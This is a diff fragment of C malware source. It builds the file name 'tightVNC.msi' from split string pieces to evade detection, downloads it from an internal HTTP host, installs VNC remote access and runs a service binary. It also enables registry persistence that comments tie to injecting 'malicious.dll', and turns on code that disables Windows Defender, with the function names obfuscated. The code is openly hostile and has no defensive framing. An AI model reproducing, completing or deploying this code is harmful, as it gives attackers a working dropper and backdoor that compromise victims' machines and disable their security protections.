 	wchar_t part_14_1[] = L"/";
 	wchar_t part_14_2[] = L"t";
@@ -1969,6 +2591,31 @@ int main(){
 	wcscat(full_string_14, part_14_11);
 	//printf("size of /tightVNC.msi after concat-> %d\n",sizeof(full_string_14));
 	//wprintf(L"%s\n",full_string_14);
+	*/
+	
+	
+	char full_string_14[15];	// "\tightVNC.msi"
+	char part_14_1[] = "";
+	char part_14_2[] = "t";
+	char part_14_3[] = "ig";
+	char part_14_4[] = "htV";
+	char part_14_5[] = "N";
+	char part_14_6[] = "C";
+	char part_14_7[] = ".";
+	char part_14_8[] = "m";
+	char part_14_9[] = "s";
+	char part_14_10[] = "i";
+	strcpy(full_string_14, part_14_1);
+	strcat(full_string_14, part_14_2);
+	strcat(full_string_14, part_14_3);
+	strcat(full_string_14, part_14_4);
+	strcat(full_string_14, part_14_5);
+	strcat(full_string_14, part_14_6);
+	strcat(full_string_14, part_14_7);
+	strcat(full_string_14, part_14_8);
+	strcat(full_string_14, part_14_9);
+	strcat(full_string_14, part_14_10);
+	
 	
 	
 	
@@ -2007,20 +2654,16 @@ int main(){
 	
 	
 	
-	LPCWSTR file_path_6 = full_string_14;
-	//netops(file_path_6,h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func);
-   /*
-	for (int i = 0; i < sizeof(keys); i++){
-		decrypt(magic,sizeof(magic),keys[i]);
-	}
-	*/
-	//fileops(full_string_16,cr_file_func,wr_file_func);
+	char full_string_n3t_4[110]; //http://192.168.100.5:8000/tightVNC.msi
+	strcpy(full_string_n3t_4,full_string_n3t);
+	strcat(full_string_n3t_4,full_string_14);
+	dw_ff1e1(full_string_n3t_4,full_string_16,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 	
 	// --- END FILE/NET OPS --- //
 	
 	
 	
-	
+
 	// --- START VNC INSTALL --- //
 	Vn_in();
 	// --- END VNC INSTALL ---//
@@ -2034,23 +2677,23 @@ int main(){
 	
 	
 	
-	
+	system(full_string_10); // exec win_service32.exe and install the service
 
 	
 
 	//PERSISTANCE SHOULD EXECUTE THE DLL_INJECTOR.EXE malicious.dll 
 	// --- START PERSISTANCE --- //
-	//persist(open_key_reg_func,set_key_reg_func,close_key_reg_func);
+	ff_131mva(open_key_reg_func,set_key_reg_func,close_key_reg_func);
 	// --- END PERSISTANCE --- //
 	
 	// --- START START THE SERVICE --- //
 	
-	//srv_stuff(open_SC_func,open_service_func,start_service_func,close_service_func);
+	all1_901A(open_SC_func,open_service_func,start_service_func,close_service_func);
 	
 	// --- END START THE SERVICE ---//
 	
 	// --- START DISABLE DEFENDER --- //
-	//disable_def(open_key_reg_func,set_key_reg_func,close_key_reg_func);	//VERY NOISY
+	faow1231(open_key_reg_func,set_key_reg_func,close_key_reg_func);	//VERY NOISY
 	// --- END DISABLE DEFENDER --- //
 	
 CLEANUP:
